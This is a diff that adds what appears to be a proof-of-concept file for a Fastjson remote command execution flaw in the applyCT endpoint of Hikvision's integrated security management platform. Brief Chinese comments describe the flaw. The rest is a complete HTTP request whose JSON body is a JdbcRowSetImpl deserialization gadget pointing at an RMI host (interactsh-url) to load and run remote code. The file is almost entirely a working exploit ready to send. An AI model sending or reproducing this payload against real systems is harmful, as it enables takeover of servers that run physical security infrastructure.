@@ -1,0 +1,12 @@
+# HIKVISION_综合安防管理平台_applyCT_Fastjson远程命令执行漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 杭州海康威视数字技术股份有限公司综合安防系统存在命令执行漏洞。攻击者可利用该漏洞获取服务器权限。
+POST /bic/ssoService/v1/applyCT?acid=80000902&bid=hd_tag_m8mv25y7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25y7
+RM-PRO-Token: 8761d2905cbb55ccae5005ca84cd7f0c
+RM-PRO-Time: 1742808513435
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://interactsh-url/Exploit","autoCommit":true},"hfe4zyyzldp":"="}
